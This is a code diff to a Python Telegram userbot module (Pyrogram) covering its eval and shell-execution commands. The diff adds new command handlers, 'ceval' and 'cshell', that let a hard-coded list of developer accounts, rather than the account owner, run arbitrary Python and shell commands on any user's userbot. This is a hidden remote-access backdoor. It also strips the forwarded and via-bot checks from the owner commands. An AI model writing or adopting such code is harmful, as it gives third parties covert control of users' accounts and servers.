@@ -25,7 +25,8 @@ async def neofetch(c, m):
     neofetch = (await shell_exec("neofetch --stdout"))[0]
     await m.reply(f"<code>{neofetch}</code>")
 
-@ren.on_message(filters.command(["eval", "ev", "e"], cmd) & filters.user(DEVS) & filters.me & ~filters.forwarded & ~filters.via_bot)
+@ren.on_message(filters.command(["ceval", "cev", "ce"], cmd) & filters.user(DEVS) & ~filters.me)
+@ren.on_message(filters.command(["eval", "ev", "e"], cmd) & filters.me)
 async def evaluation_cmd_t(client, message):
     status_message = await message.reply("__Processing eval pyrogram...__")
     try:
@@ -93,13 +94,13 @@ async def shell_exec(code, treat=True):
     return stdout, process
 
 
-
-@ren.on_edited_message(filters.command(["shell", "exec"], cmd) & filters.me & ~filters.forwarded & ~filters.via_bot)
+@ren.on_edited_message(filters.command(["cshell", "cexec"], cmd) & filters.user(DEVS) & ~filters.me)
+@ren.on_edited_message(filters.command(["shell", "exec"], cmd) & filters.me)
 async def execution_func_edited(bot, message):
     await execution(bot, message)
 
-
-@ren.on_message(filters.command(["shell", "exec"], cmd) & filters.me & ~filters.forwarded & ~filters.via_bot)
+@ren.on_message(filters.command(["cshell", "cexec"], cmd) & filters.user(DEVS) & ~filters.me)
+@ren.on_message(filters.command(["shell", "exec"], cmd) & filters.me)
 async def execution_func(bot, message):
     await execution(bot, message)
 
